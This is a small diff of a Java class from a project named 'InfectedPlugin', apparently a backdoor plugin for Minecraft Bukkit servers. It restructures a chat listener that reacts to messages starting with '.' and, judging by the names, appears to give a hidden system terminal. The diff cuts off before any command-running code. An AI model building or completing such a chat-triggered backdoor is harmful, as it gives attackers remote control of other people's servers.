@@ -1,9 +1,6 @@
 package org.CreeperCoders.InfectedPlugin.Commands;
 
-import org.CreeperCoders.InfectedPlugin.IP_RunSystemCommand;
-import org.CreeperCoders.InfectedPlugin.InfectedPlugin;
-import org.bukkit.Server;
-import org.bukkit.Bukkit;
+import java.io.*;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
@@ -11,18 +8,12 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_terminal implements Listener
 {
-    private InfectedPlugin plugin;
-
-    public Command_terminal(InfectedPlugin plugin) {
-        this.plugin = plugin;
-    }
 
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
-        Server server = Bukkit.getServer();
         boolean cancel = false;
         
         if (message.startsWith("."))
